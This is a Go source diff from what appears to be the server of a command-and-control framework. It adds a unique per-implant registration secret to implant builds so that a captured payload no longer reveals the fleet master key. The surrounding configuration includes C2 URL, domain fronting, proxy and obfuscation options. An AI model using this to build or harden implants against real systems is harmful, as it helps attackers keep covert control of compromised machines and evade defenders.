@@ -3,6 +3,7 @@ package server
 import (
 	"encoding/base64"
 	"fmt"
+	"log/slog"
 	"net/http"
 	"os"
 	"strings"
@@ -136,6 +137,23 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) payload.ImplantConfig {
 		beaconKey = s.serverBeaconKey()
 	}
 
+	// v3: per-implant registration secret. When no explicit per-build beacon
+	// key was supplied, the build would otherwise embed the fleet master key —
+	// instead generate a unique 32-byte registration secret, persist it sealed
+	// server-side, and embed ONLY that secret (plus its public id) in the
+	// binary. Extracting one payload then yields no other agent's keys.
+	regSecretID := ""
+	regSecretB64 := ""
+	if beaconKey != "" && s != nil {
+		if id, secretB64, err := s.createRegSecret(); err == nil {
+			regSecretID = id
+			regSecretB64 = secretB64
+			beaconKey = "" // v3 payloads never carry the master key
+		} else {
+			slog.Error("v3 reg secret creation failed, falling back to v2", "error", err)
+		}
+	}
+
 	return payload.ImplantConfig{
 		C2URL:           form.C2URL,
 		Protocol:        form.Protocol,
@@ -159,6 +177,8 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) payload.ImplantConfig {
 		Proxy:           form.Proxy,
 		CryptoKey:       form.CryptoKey,
 		BeaconKey:       beaconKey,
+		RegSecretID:     regSecretID,
+		RegSecret:       regSecretB64,
 		Architecture:    arch,
 		DomainFront:     form.DomainFront,
 		Obfuscate:       form.Obfuscate == "true" || form.Obfuscate == "1",
